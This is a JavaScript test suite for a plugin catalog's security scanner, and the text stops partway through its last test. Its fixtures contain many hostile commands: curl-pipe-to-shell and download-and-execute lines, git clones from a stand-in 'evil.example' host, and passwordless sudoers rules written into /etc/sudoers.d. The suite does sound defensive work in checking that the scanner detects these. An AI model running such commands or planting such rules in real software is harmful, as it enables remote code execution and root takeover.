import assert from "node:assert/strict";
import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import {
  buildCatalog,
  resolveSnapshot,
} from "../scripts/build-catalog.mjs";
import {
  assertApprovalAllowed,
  buildSecurityBaseline,
  buildSecurityBaselineFailureReport,
  buildSecurityBaselineReport,
  checkBlockingLabels,
  checkCommitBinding,
  detectElevatedCapabilities,
  detectUnsafeRemoteExecution,
  findLatestSecurityBaseline,
  isSecurityScanPath,
  parseSecurityBaselineMarker,
  resolveSubmissionSnapshot,
  securityBaselineBlocksApproval,
  securityBaselineEligibleForVerifiedListing,
  securityBaselineErrorMarker,
  securityBaselineMarkerPrefix,
  securityBaselineScanLimitExitCode,
  securityAssetProbeFileLimit,
  verifiedPublicationDisposition,
  securitySnapshotByteLimit,
  securitySnapshotFileLimit,
  serializeSecurityBaselineMarker,
} from "../scripts/security-baseline.mjs";
import { probeSnapshotFile } from "../scripts/security-github-snapshot.mjs";
import { securityBinaryProbeByteLimit } from "../scripts/security-baseline-limits.mjs";
import { writeValidationMetadata } from "../scripts/validate-submission.mjs";

const commit = "a".repeat(40);
const otherCommit = "b".repeat(40);
const checkedAt = "2026-08-12T20:00:00.000Z";

function baseline(files, overrides = {}) {
  return {
    ...buildSecurityBaseline({
      repository: "example/plugin",
      repoUrl: "https://github.com/example/plugin",
      commitSha: commit,
      files,
      ...overrides,
    }, { checkedAt }),
    pluginIds: ["example.plugin"],
  };
}

function file(path, content) {
  return { path, content };
}

function githubFixtureFetch({ tree, contents, treeSha = "c".repeat(40) }) {
  return async (url, options = {}) => {
    const value = String(url);
    if (value.endsWith("/repos/example/plugin")) {
      return new Response(JSON.stringify({
        private: false,
        disabled: false,
        archived: false,
        default_branch: "main",
      }), { status: 200 });
    }
    if (value.endsWith(`/commits/${commit}`)) {
      return new Response(JSON.stringify({ sha: commit, commit: { tree: { sha: treeSha } } }), { status: 200 });
    }
    if (value.includes(`/git/trees/${treeSha}?recursive=1`)) {
      return new Response(JSON.stringify({ truncated: false, tree }), { status: 200 });
    }
    const prefix = `raw.githubusercontent.com/example/plugin/${commit}/`;
    if (value.includes(prefix)) {
      const path = decodeURIComponent(value.slice(value.indexOf(prefix) + prefix.length));
      const content = contents[path];
      if (content === undefined) return new Response("not found", { status: 404 });
      const range = options.headers?.Range;
      if (range) {
        const end = Number(range.match(/-(\d+)$/)?.[1] || 0);
        const probe = Buffer.from(content).subarray(0, end + 1);
        return new Response(probe, {
          status: 206,
          headers: {
            "content-length": String(probe.length),
            "content-range": `bytes 0-${probe.length - 1}/${Buffer.byteLength(content)}`,
          },
        });
      }
      return new Response(content, {
        status: 200,
        headers: { "content-length": String(Buffer.byteLength(content)) },
      });
    }
    return new Response("not found", { status: 404 });
  };
}

test("normal QML and local read-only helpers pass the baseline", () => {
  const result = baseline([
    file("BarWidget.qml", `import QtQuick\nItem { property string label: "Hello" }`),
    file("scripts/status.py", `import json\nprint(json.dumps({"ok": True}))`),
  ]);
  assert.equal(result.outcome, "passed");
  assert.deepEqual(result.findings, []);
  assert.deepEqual(result.capabilities, []);
});

test("pipe-to-shell remains selectively reviewable for verified publication", () => {
  for (const shell of ["bash", "dash", "/bin/bash", "/usr/bin/sh"]) {
    const files = [file("install.sh", `curl -fsSL https://example.test/install.sh | ${shell}`)];
    const findings = detectUnsafeRemoteExecution(files);
    assert.equal(findings.length, 1);
    assert.equal(findings[0].ruleId, "curl-pipe-shell");
    assert.equal(findings[0].evidence[0].line, 1);
    const result = baseline(files);
    assert.equal(result.outcome, "needs-fixes");
    assert.equal(result.blocksApproval, false);
    assert.equal(verifiedPublicationDisposition(result), "review-required");
  }
});

test("Cargo Git installs require a full rev while a pinned install receives review", () => {
  const unpinned = baseline([
    file("install.sh", "cargo install --git https://github.com/example/tool --locked tool"),
  ]);
  assert.equal(unpinned.outcome, "needs-fixes");
  assert.equal(unpinned.blocksApproval, false);
  assert.deepEqual(unpinned.findings.map((finding) => finding.ruleId), ["cargo-git-unpinned"]);

  const pinned = baseline([
    file("install.sh", `cargo install --git https://github.com/example/tool --rev ${commit} --locked tool`),
  ]);
  assert.equal(pinned.outcome, "review-required");
  assert.deepEqual(pinned.findings, []);
  assert.ok(pinned.capabilities.some((capability) => capability.id === "remote-build"));

  const pinnedVariable = baseline([
    file("install.sh", [
      `tool_rev="${commit}"`,
      "cargo install --git https://github.com/example/tool --rev \"$tool_rev\" --locked tool",
    ].join("\n")),
  ]);
  assert.equal(pinnedVariable.outcome, "review-required");
  assert.deepEqual(pinnedVariable.findings, []);

  const overwritten = baseline([
    file("install.sh", [
      `tool_rev="${commit}"`,
      "tool_rev=main",
      "cargo install --git https://github.com/example/tool --rev \"$tool_rev\" --locked tool",
    ].join("\n")),
  ]);
  assert.equal(overwritten.outcome, "needs-fixes");

  const mentionedOnly = baseline([
    file("install.sh", [
      `echo tool_rev=${commit}`,
      "cargo install --git https://github.com/example/tool --rev \"$tool_rev\" --locked tool",
    ].join("\n")),
  ]);
  assert.equal(mentionedOnly.outcome, "needs-fixes");

  for (const mutation of [
    'tool_rev="$(printf main)"',
    "unset tool_rev",
    "read -r tool_rev < revision.txt",
    "printf -v tool_rev '%s' main",
    "tool_rev+=x",
    "if true; then tool_rev=main; fi",
    "(( tool_rev = 1 ))",
  ]) {
    const mutated = baseline([
      file("install.sh", [
        `tool_rev="${commit}"`,
        mutation,
        "cargo install --git https://github.com/example/tool --rev \"$tool_rev\" --locked tool",
      ].join("\n")),
    ]);
    assert.equal(mutated.outcome, "needs-fixes", mutation);
  }

  const conditionalPin = baseline([
    file("install.sh", [
      "tool_rev=main",
      `false && tool_rev=${commit}`,
      "cargo install --git https://github.com/example/tool --rev \"$tool_rev\" --locked tool",
    ].join("\n")),
  ]);
  assert.equal(conditionalPin.outcome, "needs-fixes");

  const assignedTooLate = baseline([
    file("install.sh", [
      "tool_rev=main",
      "cargo install --git https://github.com/example/tool --rev \"$tool_rev\" --locked tool",
      `tool_rev="${commit}"`,
    ].join("\n")),
  ]);
  assert.equal(assignedTooLate.outcome, "needs-fixes");
});

test("clone-and-execute builds flag mutable refs and accept detached full commits", () => {
  const unpinned = baseline([
    file("scripts/install.sh", [
      "git clone --depth 1 https://github.com/example/tool source",
      "(cd source && go run build.go)",
    ].join("\n")),
  ]);
  assert.equal(unpinned.outcome, "needs-fixes");
  assert.equal(unpinned.blocksApproval, false);
  assert.deepEqual(
    unpinned.findings.map((finding) => finding.ruleId),
    ["remote-git-execution-unpinned"],
  );
  assert.equal(unpinned.findings[0].evidence.length, 2);

  const sameLine = baseline([
    file("run.sh", "git clone https://github.com/example/tool source && cd source && make"),
  ]);
  assert.equal(sameLine.outcome, "needs-fixes");
  assert.deepEqual(
    sameLine.findings.map((finding) => finding.ruleId),
    ["remote-git-execution-unpinned"],
  );

  const misleadingComment = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      `git -C source checkout main # ${commit}`,
      "(cd source && go run build.go)",
    ].join("\n")),
  ]);
  assert.equal(misleadingComment.outcome, "needs-fixes");

  const wrongDirectory = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      `git -C elsewhere checkout --detach ${commit}`,
      "(cd source && go run build.go)",
    ].join("\n")),
  ]);
  assert.equal(wrongDirectory.outcome, "needs-fixes");

  const absoluteShell = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      "/usr/local/bin/bash source/install.sh",
    ].join("\n")),
  ]);
  assert.equal(absoluteShell.outcome, "needs-fixes");

  const absoluteMake = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      "(cd source && /usr/bin/make)",
    ].join("\n")),
  ]);
  assert.equal(absoluteMake.outcome, "needs-fixes");

  const pinned = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      `git -C source checkout --detach ${commit} && (cd source && go run build.go)`,
    ].join("\n")),
  ]);
  assert.equal(pinned.outcome, "review-required");
  assert.deepEqual(pinned.findings, []);
  assert.ok(pinned.capabilities.some((capability) => capability.id === "remote-build"));

  const inlinePinned = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source \\",
      "  && git -C source checkout --detach " + commit + " \\",
      "  && make -C source",
    ].join("\n")),
  ]);
  assert.equal(inlinePinned.outcome, "review-required");
  assert.deepEqual(inlinePinned.findings, []);
  assert.ok(inlinePinned.capabilities.some((capability) => capability.id === "remote-build"));

  const pinnedWithCd = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source &&",
      "cd source &&",
      `git checkout --detach ${commit} &&`,
      "make",
    ].join("\n")),
  ]);
  assert.equal(pinnedWithCd.outcome, "review-required");

  const pinAfterExecution = baseline([
    file("scripts/install.sh", [
      `git clone https://github.com/example/tool source && make -C source && git -C source checkout --detach ${commit}`,
    ].join("\n")),
  ]);
  assert.equal(pinAfterExecution.outcome, "needs-fixes");

  const pinThenMutableCheckout = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      `git -C source checkout --detach ${commit} &&`,
      "/usr/bin/git -C source checkout main &&",
      "(cd source && make)",
    ].join("\n")),
  ]);
  assert.equal(pinThenMutableCheckout.outcome, "needs-fixes");

  const restoreMutableSource = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source &&",
      `git -C source checkout --detach ${commit} &&`,
      "git -C source restore --source origin/main . &&",
      "make -C source",
    ].join("\n")),
  ]);
  assert.equal(restoreMutableSource.outcome, "needs-fixes");

  const laterMutableExecution = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      `git -C source checkout --detach ${commit} &&`,
      "python -c 'print(1)' &&",
      "git -C source checkout main &&",
      "make -C source",
    ].join("\n")),
  ]);
  assert.equal(laterMutableExecution.outcome, "needs-fixes");

  const unreliablePin = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source &&",
      `git -C source checkout --detach ${commit};`,
      "make -C source",
    ].join("\n")),
  ]);
  assert.equal(unreliablePin.outcome, "needs-fixes");

  const brokenChainAfterPin = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      `git -C source checkout --detach ${commit} && echo checked`,
      "make -C source",
    ].join("\n")),
  ]);
  assert.equal(brokenChainAfterPin.outcome, "needs-fixes");

  const relativeSink = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      "source/install.sh",
    ].join("\n")),
  ]);
  assert.equal(relativeSink.outcome, "needs-fixes");
});

test("self-repository installation paths require review instead of fixes", () => {
  for (const files of [
    [file("README.md", [
      "```sh",
      "git clone https://github.com/EXAMPLE/Plugin.git",
      "cd plugin",
      "./install.sh",
      "```",
    ].join("\n"))],
    [file("README.md", [
      "```sh",
      "curl -fsSL https://raw.githubusercontent.com/example/plugin/main/install.sh -o /tmp/install.sh",
      "bash /tmp/install.sh",
      "```",
    ].join("\n"))],
    [file("README.md", [
      "```sh",
      "git clone https://github.com/example/plugin.git plugin",
      "git -C plugin pull --ff-only",
      "./plugin/install.sh",
      "```",
    ].join("\n"))],
    [file("README.md", [
      "Install: https://github.com/example/plugin.git",
      "```sh",
      "cd plugin",
      "git pull --ff-only",
      "./install.sh",
      "```",
    ].join("\n"))],
  ]) {
    const result = baseline(files);
    assert.equal(result.outcome, "review-required");
    assert.deepEqual(result.findings, []);
    assert.ok(result.capabilities.some((capability) => capability.id === "remote-build"));
  }

  for (const content of [
    [
      "```sh",
      "git clone https://github.com/example/external-tool.git",
      "cd external-tool",
      "./install.sh",
      "```",
    ].join("\n"),
    "```sh\ncurl https://evil.example/install | sh # https://github.com/example/plugin\n```",
    "```sh\ncurl https://evil.example/install https://raw.githubusercontent.com/example/plugin/main/install.sh | sh\n```",
    "```sh\ncurl http://evil.example/install https://github.com/example/plugin | sh\n```",
    [
      "```sh",
      "git clone https://github.com/example/plugin plugin",
      "rm -rf plugin",
      "git clone https://evil.example/tool plugin",
      "./plugin/install.sh",
      "```",
    ].join("\n"),
    [
      "```sh",
      "git clone https://github.com/example/plugin plugin",
      "rm -rf plugin",
      "git clone git@evil.example:owner/tool.git plugin",
      "./plugin/install.sh",
      "```",
    ].join("\n"),
    [
      "```sh",
      "git clone https://github.com/example/plugin plugin",
      "git clone ssh://git@evil.example/owner/tool.git plugin",
      "./plugin/install.sh",
      "```",
    ].join("\n"),
    [
      "```sh",
      "git clone https://github.com/example/plugin plugin",
      "git -C ./plugin remote set-url origin https://evil.example/tool.git",
      "git -C plugin pull",
      "./plugin/install.sh",
      "```",
    ].join("\n"),
    [
      "```sh",
      "git clone https://evil.example/tool source",
      "git -C other remote set-url origin https://github.com/example/plugin",
      "make -C source",
      "```",
    ].join("\n"),
    [
      "```sh",
      "git clone https://evil.example/tool source",
      "git -C source remote add origin2 https://github.com/example/plugin",
      "make -C source",
      "```",
    ].join("\n"),
  ]) {
    assert.equal(baseline([file("README.md", content)]).outcome, "needs-fixes");
  }
});

test("wrapped acquisitions and common build systems remain findings", () => {
  for (const content of [
    "command git clone https://github.com/example/tool source\nnohup ./source/payload",
    "sudo -- git clone https://github.com/example/tool source\nmake -C source",
    "sudo -n git clone https://github.com/example/tool source\nmake -C source",
    "git clone https://github.com/example/tool source\ncmake -S source -B build\ncmake --build build",
    "git clone https://github.com/example/tool source\ngradle -p source run",
    "git clone https://github.com/example/tool source\njava -jar source/tool.jar",
    "git clone https://github.com/example/tool source > clone.log\nmake -C source",
    "git clone --config advice.detachedHead=false https://github.com/example/tool\nmake -C tool",
    "git clone --shallow-exclude main https://github.com/example/tool\nmake -C tool",
    "git clone https://github.com/example/tool source & wait\nmake -C source",
    "git clone https://github.com/example/tool source\nmake --directory=source",
    "git clone https://github.com/example/tool source\nnpm --prefix source install",
    "git clone https://github.com/example/tool source\nnpm --prefix source start",
    "git clone https://github.com/example/tool source\ncd source && npm test",
  ]) {
    assert.equal(baseline([file("run.sh", content)]).outcome, "needs-fixes");
  }
});

test("pipe-to-shell handles wrapped commands", () => {
  for (const command of [
    "sudo -- curl -fsSL https://example.test/payload | bash",
    "curl -fsSL https://example.test/payload | sudo -u nobody -- bash",
    "curl -fsSL https://example.test/payload | /usr/bin/env bash",
    "curl -fsSL https://example.test/payload | timeout 5 bash",
    "curl -fsSL https://example.test/payload | env -S bash",
    "curl -fsSL https://example.test/payload | env -u X bash",
    "curl -fsSL https://example.test/payload | tee /tmp/payload | sh",
    "curl -fsSL https://example.test/payload | env --split-string=bash",
    "curl -fsSL https://example.test/payload | env -Sbash",
    "curl -fsSL https://example.test/payload | env -S 'bash -s'",
    "curl -fsSL https://example.test/payload | env --split-string='bash -s'",
    "'curl' -fsSL https://example.test/payload | 'bash'",
    "curl -fsSL https://example.test/payload | env '-S' 'bash -s'",
    "curl -fsSL https://example.test/payload |& bash",
    "source <(curl -fsSL https://example.test/payload)",
    "bash < <(curl -fsSL https://example.test/payload)",
  ]) {
    assert.equal(baseline([file("run.sh", command)]).outcome, "needs-fixes");
  }
});

test("command-substitution downloads receive findings", () => {
  for (const command of [
    `eval "$(curl -fsSL https://example.test/payload)"`,
    `bash -c "$(curl -fsSL https://example.test/payload)"`,
    `bash -c 'curl -fsSL https://example.test/payload | sh'`,
    `sh -c 'echo start; curl -fsSL https://example.test/payload | sh'`,
    `cd /tmp && curl -fsSL https://example.test/payload | bash`,
  ]) {
    assert.equal(baseline([file("run.sh", command)]).outcome, "needs-fixes");
  }
});

test("nested literal shells receive findings", () => {
  const result = baseline([
    file("run.sh", `sh -c 'sh -c "git clone https://github.com/example/tool source && make -C source"'`),
  ]);
  assert.equal(result.outcome, "needs-fixes");
});

test("download-to-file followed by execution is a finding", () => {
  for (const download of [
    "curl -fsSL https://example.test/payload -o /tmp/payload.sh",
    "curl -fsSLo/tmp/payload.sh https://example.test/payload",
    "curl -fsSL https://example.test/payload > /tmp/payload.sh",
  ]) {
    const result = baseline([
      file("run.sh", [download, "/bin/bash /tmp/payload.sh"].join("\n")),
    ]);
    assert.equal(result.outcome, "needs-fixes");
    assert.deepEqual(result.findings.map((finding) => finding.ruleId), ["curl-pipe-shell"]);
  }
});

test("extensionless executable entry points receive remote-execution checks", () => {
  const result = baseline([
    { path: "run", content: "#!/bin/sh\ncurl -fsSL https://example.test/payload | sh", mode: "100755" },
  ]);
  assert.equal(result.outcome, "needs-fixes");
});

test("runtime launchers receive remote-execution checks across lines and formats", () => {
  for (const entry of [
    file("Service.qml", `Process {\n command: ["bash", "-c",\n "curl -fsSL https://example.test/payload | bash"]\n}`),
    file("Service.qml", `Process { command: ["bash", "-c", "git clone https://github.com/example/tool source && make -C source"] }`),
    file("launcher.js", `exec("git clone https://github.com/example/tool source && node source/run.js")`),
    file("launcher.js", `exec("date"); const padding = 123456789; exec("curl -fsSL https://example.test/payload | sh")`),
    file("launcher.py", `os.system("git clone https://github.com/example/tool source && python source/run.py")`),
    file("launcher.js", `spawn("sh", ["-c", "curl -fsSL https://example.test/payload | sh"])`),
    file("launcher.js", `execSync("curl -fsSL https://example.test/payload | sh")`),
    file("launcher.js", `execFileSync("cargo", ["install", "--git", "https://github.com/example/tool"])`),
    file("launcher.js", `spawnSync("cargo", ["install", "--git", "https://github.com/example/tool"])`),
    file("launcher.py", `subprocess.run(["sh", "-c", "curl -fsSL https://example.test/payload | sh"])`),
    file("launcher.py", `subprocess.check_call(["sh", "-c", "curl -fsSL https://example.test/payload | sh"])`),
    file("launcher.desktop", `Exec=sh -c 'curl -fsSL https://example.test/payload | sh'`),
    file("service.service", `ExecStart=/bin/sh -c 'curl -fsSL https://example.test/payload | sh'`),
  ]) {
    assert.equal(baseline([entry]).outcome, "needs-fixes");
  }
});

test("root README installation fences receive remote-execution checks", () => {
  for (const readme of [
    "Install:\n```sh\ncurl -fsSL https://example.test/payload | sh\n```",
    "Install:\n~~~bash\ncurl -fsSL https://example.test/payload | sh\n~~~",
    "Install:\n```shell\ncurl -fsSL https://example.test/payload | sh\n```",
    "Install:\n   ~~~sh\n   curl -fsSL https://example.test/payload | sh\n   ~~~",
    "Install:\n```shell\ncurl -fsSL https://example.test/payload | sh\n````",
  ]) {
    assert.equal(baseline([file("README.md", readme)]).outcome, "needs-fixes");
  }

  const development = baseline([file("README.md", [
    "## Development",
    "```sh",
    "git clone https://github.com/example/tool source",
    "cd source",
    "npm install",
    "```",
  ].join("\n"))]);
  assert.notEqual(development.outcome, "needs-fixes");

  const pinned = baseline([file("README.md", [
    "Install:",
    "```sh",
    "git clone https://github.com/example/tool source &&",
    `git -C source checkout --detach ${commit} &&`,
    "make -C source",
    "```",
  ].join("\n"))]);
  assert.equal(pinned.outcome, "review-required");
});

test("absolute system utilities are not remote execution sinks", () => {
  for (const utility of [
    "/bin/mkdir out",
    "/usr/bin/cp source/README /tmp/README",
    "/usr/bin/chmod 600 source/data",
    "/bin/rm source/file",
  ]) {
    const result = baseline([file("run.sh", `git clone https://github.com/example/tool source\n${utility}`)]);
    assert.equal(result.outcome, "passed");
  }
});

test("package managers, privilege boundaries, installers, and services require review", () => {
  const files = [
    file("bin/wake-word-setup", `${"${VENV}"}/bin/pip install openwakeword`),
    file("scripts/install.sh", "sudo systemctl --user enable --now example.service"),
    file("systemd/example.service", "[Service]\nExecStart=/usr/bin/example"),
    file("scripts/packages.sh", "cargo install ripgrep\ngo install example.test/tool@latest\ngem install example\nbrew install example"),
  ];
  assert.deepEqual(detectUnsafeRemoteExecution(files), []);
  const capabilities = detectElevatedCapabilities(files);
  assert.deepEqual(
    capabilities.map((capability) => capability.id).sort(),
    ["installer", "package-manager", "privilege", "service-management"],
  );
  assert.equal(baseline(files).outcome, "review-required");
});

test("selective enforcement blocks dangerous sudoers commands but reviews narrow helpers", () => {
  for (const policy of [
    "%wheel ALL=(ALL) NOPASSWD: ALL",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/kill",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/kill *",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/kill -TERM *",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/kill -TERM ?",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/kill -TERM [0-9][0-9]",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/*",
    "%wheel ALL=(root) NOPASSWD: /usr/local/bin/*",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/busybox sh",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/php",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/deno",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/java",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/dotnet",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/systemctl restart *",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/bash",
    "$USER ALL=(ALL:ALL) NOPASSWD: /usr/bin/wg, /usr/bin/wg-quick",
  ]) {
    const result = baseline([file("scripts/install-helper.sh", `printf '%s\\n' '${policy}' | sudo tee /etc/sudoers.d/example`)]);
    assert.equal(result.outcome, "needs-fixes");
    assert.equal(result.blocksApproval, true);
    assert.deepEqual(result.findings.map((finding) => finding.ruleId), [
      "sudoers-dangerous-passwordless-command",
    ]);
    assert.ok(result.capabilities.some((item) => item.id === "sudoers-modification"));
    assert.equal(securityBaselineBlocksApproval(result), true);
    assert.throws(
      () => assertApprovalAllowed(
        { labels: ["validated"] },
        parseSecurityBaselineMarker(serializeSecurityBaselineMarker(result)),
        { commitSha: commit },
        "https://github.com/example/plugin",
      ),
      (error) => error.code === "approval-security-needs-fixes",
    );
  }

  for (const policy of [
    "%wheel ALL=(root) NOPASSWD: /usr/lib/example/power-reader --sample",
    "%wheel ALL=(root) NOPASSWD: /usr/local/libexec/example-helper reset, /usr/local/libexec/example-helper stop, /usr/local/libexec/example-helper start *",
  ]) {
    const result = baseline([file("scripts/install-helper.sh", `printf '%s\\n' '${policy}' | sudo tee /etc/sudoers.d/example`)]);
    assert.equal(result.outcome, "review-required");
    assert.deepEqual(result.findings, []);
    assert.ok(result.capabilities.some((item) => item.id === "sudoers-modification"));
    assert.equal(result.blocksApproval, false);
  }

  const policyFile = baseline([
    file("example.sudoers", "%wheel ALL=(root) NOPASSWD: /usr/lib/example/power-reader --sample"),
  ]);
  assert.equal(policyFile.outcome, "review-required");
  assert.deepEqual(policyFile.capabilities.map((item) => item.id), ["sudoers-modification"]);

  const dangerousPolicyFile = baseline([
    file("example.sudoers", "%wheel ALL=(root) NOPASSWD: /usr/bin/kill *"),
  ]);
  assert.equal(dangerousPolicyFile.outcome, "needs-fixes");
  assert.equal(dangerousPolicyFile.blocksApproval, true);

  const aliasPolicy = baseline([file("example.sudoers", [
    "Cmnd_Alias PROCESS_CONTROL = /usr/bin/kill *",
    "%wheel ALL=(root) NOPASSWD: PROCESS_CONTROL",
  ].join("\n"))]);
  assert.equal(aliasPolicy.blocksApproval, true);

  const splitAliasPolicy = baseline([
    file("commands.sudoers", "Cmnd_Alias PROCESS_CONTROL = /usr/bin/kill *"),
    file("access.sudoers", "%wheel ALL=(root) NOPASSWD: PROCESS_CONTROL"),
  ]);
  assert.equal(splitAliasPolicy.blocksApproval, true);

  for (const installer of [
    [file("scripts/install.sh", [
      `RULE='%wheel ALL=(root) NOPASSWD: /usr/bin/kill *'`,
      `printf '%s\\n' "$RULE" | sudo tee /etc/sudoers.d/example`,
    ].join("\n"))],
    [file("scripts/install.sh", [
      "sudo tee /etc/sudoers.d/example <<'EOF'",
      "%wheel ALL=(root) NOPASSWD: /usr/bin/kill *",
      "EOF",
    ].join("\n"))],
    [file("scripts/install.sh", [
      `RULE='%wheel ALL=(root) NOPASSWD: /usr/bin/kill *'`,
      "sudo tee /etc/sudoers.d/example <<EOF",
      "$RULE",
      "EOF",
    ].join("\n"))],
    [file("scripts/install.sh", [
      "sudo tee /etc/sudoers.d/example <<\\EOF",
      "%wheel ALL=(root) NOPASSWD: /usr/bin/kill *",
      "EOF",
    ].join("\n"))],
    [file(
      "scripts/install.sh",
      `printf '%s\\n' '%wheel ALL=(root) NOPASSWD: /usr/bin/kill *' | sudo dd of=/etc/sudoers.d/example`,
    )],
    [file("scripts/install.sh", [
      "tmp=$(mktemp)",
      "cat > \"$tmp\" <<'EOF'",
      "%wheel ALL=(root) NOPASSWD: /usr/bin/kill *",
      "EOF",
      "sudo install -m 0440 \"$tmp\" /etc/sudoers.d/example",
    ].join("\n"))],
    [
      file("scripts/install.sh", "sudo install -m 0440 policy /etc/sudoers.d/example"),
      file("policy", "%wheel ALL=(root) NOPASSWD: /usr/bin/kill *"),
    ],
    [
      file("scripts/install.sh", "sudo dd if=policy of=/etc/sudoers.d/example"),
      file("policy", "%wheel ALL=(root) NOPASSWD: /usr/bin/kill *"),
    ],
  ]) {
    const result = baseline(installer);
    assert.equal(result.blocksApproval, true);
  }

  const destinationVariable = baseline([file("scripts/install.sh", [
    "SUDOERS=/etc/sudoers.d/example",
    `RULE='%wheel ALL=(root) NOPASSWD: /usr/bin/kill *'`,
    `printf '%s\\n' "$RULE" > "$SUDOERS"`,
  ].join("\n"))]);
  assert.equal(destinationVariable.blocksApproval, true);

  for (const safeDestinationOrder of [
    [
      "TARGET=/tmp/example-policy",
      `RULE='%wheel ALL=(root) NOPASSWD: /usr/bin/kill *'`,
      `printf '%s\\n' "$RULE" > "$TARGET"`,
      "TARGET=/etc/sudoers.d/example",
    ],
    [
      "TARGET=/etc/sudoers.d/example",
      "TARGET=/tmp/example-policy",
      `RULE='%wheel ALL=(root) NOPASSWD: /usr/bin/kill *'`,
      `printf '%s\\n' "$RULE" > "$TARGET"`,
    ],
  ]) {
    assert.equal(baseline([file("scripts/install.sh", safeDestinationOrder.join("\n"))]).blocksApproval, false);
  }

  const exactStagedPath = baseline([
    file("scripts/install.sh", "sudo install -m 0440 foo/policy /etc/sudoers.d/example"),
    file("foo/policy", "%wheel ALL=(root) NOPASSWD: /usr/lib/example/helper fixed"),
    file("bar/policy", "%wheel ALL=(root) NOPASSWD: /usr/bin/kill *"),
  ]);
  assert.equal(exactStagedPath.outcome, "review-required");
  assert.equal(exactStagedPath.blocksApproval, false);

  const conditionalPolicyReassignment = baseline([file("scripts/install.sh", [
    `RULE='%wheel ALL=(root) NOPASSWD: /usr/bin/kill *'`,
    "is_safe && RULE='ordinary text'",
    `printf '%s\\n' "$RULE" | sudo tee /etc/sudoers.d/example`,
  ].join("\n"))]);
  assert.equal(conditionalPolicyReassignment.blocksApproval, true);

  const conditionalDestinationReassignment = baseline([file("scripts/install.sh", [
    "TARGET=/etc/sudoers.d/example",
    "has_tmp && TARGET=/tmp/example-policy",
    `RULE='%wheel ALL=(root) NOPASSWD: /usr/bin/kill *'`,
    `printf '%s\\n' "$RULE" > "$TARGET"`,
  ].join("\n"))]);
  assert.equal(conditionalDestinationReassignment.blocksApproval, true);

  const emptyPolicyReassignment = baseline([file("scripts/install.sh", [
    `RULE='%wheel ALL=(root) NOPASSWD: /usr/bin/kill *'`,
    "RULE=",
    `printf '%s\\n' "$RULE" | sudo tee /etc/sudoers.d/example`,
  ].join("\n"))]);
  assert.equal(emptyPolicyReassignment.blocksApproval, false);

  const writeBeforeSafeReassignment = baseline([file("scripts/install.sh", [
    `RULE='%wheel ALL=(root) NOPASSWD: /usr/bin/kill *'`,
    `printf '%s\\n' "$RULE" | sudo tee /etc/sudoers.d/example`,
    "RULE='ordinary text'",
  ].join("\n"))]);
  assert.equal(writeBeforeSafeReassignment.blocksApproval, true);

  const safeWriteBeforeDangerousReassignment = baseline([file("scripts/install.sh", [
    `RULE='%wheel ALL=(root) NOPASSWD: /usr/lib/example/helper fixed'`,
    `printf '%s\\n' "$RULE" | sudo tee /etc/sudoers.d/example`,
    `RULE='%wheel ALL=(root) NOPASSWD: /usr/bin/kill *'`,
  ].join("\n"))]);
  assert.equal(safeWriteBeforeDangerousReassignment.blocksApproval, false);

  for (const safePolicy of [
    "%wheel ALL=(root) NOPASSWD: /usr/lib/example/helper, PASSWD: /usr/bin/kill *",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/kill *, PASSWD: /usr/bin/kill *",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/kill *, PASSWD: ALL",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/kill *, NOPASSWD: !/usr/bin/kill *",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/kill \"\"",
    "%wheel ALL=(root) NOPASSWD: /bin/sh /usr/lib/example/fixed-helper",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/busybox sh /usr/lib/example/fixed-helper",
    "%wheel ALL=(root) NOPASSWD: /usr/bin/toybox sh /usr/lib/example/fixed-helper",
    "%wheel ALL=(root) NOPASSWD: /usr/local/libexec/systemctl-helper start *",
    "%wheel ALL=(root) NOPASSWD: /usr/local/libexec/kill-helper stop *",
  ]) {
    const result = baseline([file("example.sudoers", safePolicy)]);
    assert.equal(result.outcome, "review-required");
    assert.equal(result.blocksApproval, false);
  }

  const warning = baseline([file(
    "scripts/check.sh",
    'echo "Never grant NOPASSWD: /usr/bin/kill *" >&2',
  )]);
  assert.equal(warning.blocksApproval, false);
  assert.deepEqual(warning.findings, []);
});

test("selective enforcement blocks privileged process control sourced from shared temp", () => {
  const unsafe = baseline([file("bin/disconnect", [
    'exec_sudo() {',
    '  sudo "$@"',
    '}',
    'PID_FILE="/tmp/example-${CONFIG_NAME}.pid"',
    'VPN_PID=$(cat "$PID_FILE")',
    'exec_sudo kill -TERM "$VPN_PID"',
  ].join("\n"))]);
  assert.deepEqual(unsafe.findings.map((finding) => finding.ruleId), [
    "privileged-process-control-from-shared-temp",
  ]);
  assert.equal(unsafe.blocksApproval, true);
